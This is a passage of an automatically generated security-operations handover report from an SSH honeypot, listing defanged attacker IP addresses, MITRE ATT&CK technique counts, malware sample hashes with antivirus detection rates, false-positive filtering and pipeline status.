| `43.156.201[.]48` | 1 | 2026-05-25 06:14 | 2026-05-25 06:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-05-25 06:29 | 2026-05-25 06:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.173.103[.]146` | 1 | 2026-05-25 07:02 | 2026-05-25 07:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.224[.]234` | 1 | 2026-05-25 09:32 | 2026-05-25 09:32 | 16s | 0 | `T1592` | 🟢 LOW |
| `83.235.16[.]111` | 1 | 2026-05-25 05:27 | 2026-05-25 05:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.248.168[.]239` | 1 | 2026-05-25 06:11 | 2026-05-25 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.159.112[.]56` | 1 | 2026-05-25 05:15 | 2026-05-25 05:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **25/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `74.208.13[.]194` | US | IONOS Inc. | **100** ⚠️ | 3 |
| `118.145.238[.]60` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `144.91.106[.]231` | FR | Contabo GmbH | **100** ⚠️ | 7 |
| `91.201.216[.]61` | KZ | Hyper Cloud Solutions LLP | **100** ⚠️ | 23 |
| `95.84.47[.]155` | RU | Network of Saratov branch of OJSC Volgatelecom | **100** ⚠️ | 2 |
| `64.227.40[.]111` | GB | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `34.140.127[.]239` | BE | Google LLC | **100** ⚠️ | 1 |
| `113.161.222[.]150` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 15 |
| `118.196.114[.]236` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `43.224.126[.]107` | LK | Lanka Government Cloud | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 244 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 106 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 94 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 47 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 46 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 54 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 933 cases |
| Tool 34  | Credential Extractor        | ✅ 200 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 53 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (6.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 39 recon entry/entries in table (20 group(s) consolidating 764 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T10:16:19Z_
